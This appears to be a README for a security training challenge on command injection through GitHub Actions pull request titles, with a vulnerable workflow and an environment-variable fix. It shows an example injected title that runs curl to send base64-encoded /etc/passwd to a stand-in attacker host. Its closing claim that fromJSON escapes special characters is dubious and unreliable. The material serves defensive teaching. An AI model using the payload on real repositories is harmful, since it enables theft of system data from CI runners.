# Challenge 2: Command Injection from Pull Request Title

This challenge demonstrates a command injection vulnerability that can occur when using the pull request title directly in a `run` step.

## Vulnerability

The `vulnerable.yml` workflow is triggered when a new pull request is opened. The `run` step in the `vulnerable_job` directly uses the pull request title in a shell command. An attacker can create a pull request with a malicious title that includes shell commands. For example, an attacker could create a pull request with the title:

```
; curl http://attacker.com/$(cat /etc/passwd | base64)
```

When the workflow runs, the shell will execute the `curl` command, sending the base64-encoded contents of the `/etc/passwd` file to the attacker's server.

## Fix

The `fixed.yml` workflow mitigates this vulnerability by passing the pull request title as an environment variable to the script. This ensures that the pull request title is treated as a single string and not executed as a command.

## Advanced Mitigation

In addition to using environment variables, you can also use the `fromJSON` function to parse the pull request title and escape any special characters. This can provide an extra layer of protection against command injection attacks.
